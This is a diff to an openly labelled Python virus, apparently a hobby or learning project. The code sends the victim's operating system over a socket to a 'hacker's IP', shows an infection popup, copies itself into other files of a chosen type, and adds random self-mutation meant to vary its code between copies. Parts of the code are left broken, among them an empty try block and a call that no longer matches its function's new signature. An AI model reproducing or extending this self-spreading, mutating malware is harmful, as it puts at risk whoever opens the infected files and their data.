@@ -7,6 +7,7 @@ import ctypes
 import subprocess
 import glob
 import os
+import random
 
 # ----------- Variables -----------
 host = '127.0.0.1' #Hacker's IP address as a string
@@ -29,15 +30,37 @@ def post_infection_msg(target_os, infection_msg):
     else:
         subprocess.run(['notify-send', msg_box_title, infection_msg])
 
-# -- Self Spread Functions
-def spread_self(targeted_file_type, virus_end_line):
+# -- Self Spread Functions --
+
+# def create_executable(code):
+#     try:
+#         # Compile the code (parsed as a string) into a code object
+#         code_obj = compile(code, '<string>', 'exec')
+#     except Exception as e:
+        
+
+        
+
+def is_end(line):
+    return True if "# END OF SCRIPT" in line and (len(line.strip()) == len("# END OF SCRIPT")) else False 
+
+def retrieve_code():
     # Open the virus current file, the virus will be extracted from this file. 
     virus_file = open(sys.argv[0], 'r')
 
-    # Read in the virus section
-    virus = [line for (i,line) in enumerate(virus_file) if i < virus_end_line]
+    # Read in the virus section using the last line comment as a marker 
+    # that the virus has ended.
+    virus = []
+    for line in virus_file:
+        virus.append(line)
+        if is_end(line): 
+            break
 
-    # Read in the virus section
+    return virus
+
+def spread_self(targeted_file_type, virus):
+
+    # Go through files with target file extension.
     for item in glob.glob(str(f"*{targeted_file_type}")):
 
         # Read in the target file
@@ -65,25 +88,48 @@ def spread_self(targeted_file_type, virus_end_line):
 
 # -- Self Mutation Functions -- 
 #region
+
+def is_ignore(line):
+    return True if "# IGNORE" in line else False
+
+def is_end_ignore(line):
+    return True if "# END IGNORE" in line else False
+
+def random_sublist(substitutions):
+    num_items = random.randint(1, len(substitutions))
+    items = list(substitutions.items())
+    return dict(random.sample(items, num_items))
+
 """
-function: mutate_instruction
+function: mutate_with_substitutions
 
-Replaces certain operations with the equivalent ones. This can be arithmetic operations or
-function calls.
+Replaces elements of the original code with potential substitutions. 
+
+
 """
-#TODO: Add in additional substitutions that are specific to the code.
-def mutate_instruction(code):
-    # Add in function calls
-    substitutions = {
-        "a + b": "a - (-b)",
-        "a * 2": "a << 1",
-        "a / 2": "a >> 1"
-    }
+def mutate_with_substitutions(code, substitutions):
+    mutated_code = []
+    ignore = False
+    sub_list = random_sublist(substitutions)
 
-    for original, substitute in substitutions.items():
-        code = code.replace(original, substitute)
+    for line in sub_list:
+        print(line)
 
-    return code
+    for line in code:
+        # Skip any sections marked by ignore
+        if is_ignore(line) == True or ignore == True:
+            ignore = True
+            if is_end_ignore(line):
+                ignore = False
+            mutated_code.append(line)
+            continue
+
+        # Mutate line
+        for original, substitute in sub_list.items():
+            line = line.replace(original, substitute)
+        mutated_code.append(line)
+    
+    return mutated_code
 
 """ 
 function: mutate_with_nop
@@ -95,30 +141,42 @@ commands such as `pass` or unnecessary variable assignments.
 #TODO: If prepend and append are working, integrate number number generator to prepend
 # and append random amounts of lines.
 def mutate_with_nop(code):
-    lines = code.splitlines()
     mutated_lines = []
+    found_end = False
 
-    for line in lines:
+    for line in code:
         mutated_lines.append(line)
-        # Randomly insert a "NOP"
-        mutated_lines.append("pass")
+        
+        if is_end(line): break 
 
-    return "\n".join(mutated_lines)
+        if line.strip() == "pass":          # Randomly insert a "NOP"
+            if random.random() < 0.05: continue
+        elif random.random() < 0.05:        # If a "NOP" already exists at the line, randomly remove it.
+            mutated_lines.append("pass\n")
+
+    return mutated_lines
 
 """
-function: swap_variables
+function: swap_code
+
+Swaps code according to the substitutions, this means that operators and variables can be
+swapped. 
 
 This simulates register swapping in assembly for python by swapping around the names
-of variables.
+of variables. 
 """
 #TODO: Change the substitutions to reflect the actual variables in the virus.
-def swap_variables(code):
+def swap_code(code):
+    # IGNORE
     substitutions = {
-        "a": "temp1",
-        "b": "temp2",
-        "temp1": "a",
-        "temp2": "b"
+        "# END OF SCRIPT": "# END OF CODE",
+        "virus": "evil_stuff",
+        "pass": "#pass"
     }
+    # END IGNORE
+
+    return mutate_with_substitutions(code, substitutions)
+
 #endregion
 
 # -- Data Exfiltration --
@@ -149,17 +207,23 @@ send_data(s, f"Target OS: '{str(target_os)}'")
 post_infection_msg(target_os, infection_message)
 
 
-# (4) Perform self mutations.
+# (4) Data Exfiltration
 
 
-# (5) Data exfiltration.
-
-
-# 5.1 For now exfiltrate the type of OS that the host is, the pwd, 
+# 4.1 For now exfiltrate the type of OS that the host is, the pwd, 
 #      and the list of files in the current directory.
+
+
+# (5) Self Mutations
+virus = retrieve_code()
+virus = mutate_with_nop(virus)
+virus = swap_code(virus)
+print(''.join(virus))
 
 
 # (6) Perform Self Spread
 spread_self(target_file_type, 164)
 
 
+
+# END OF SCRIPT
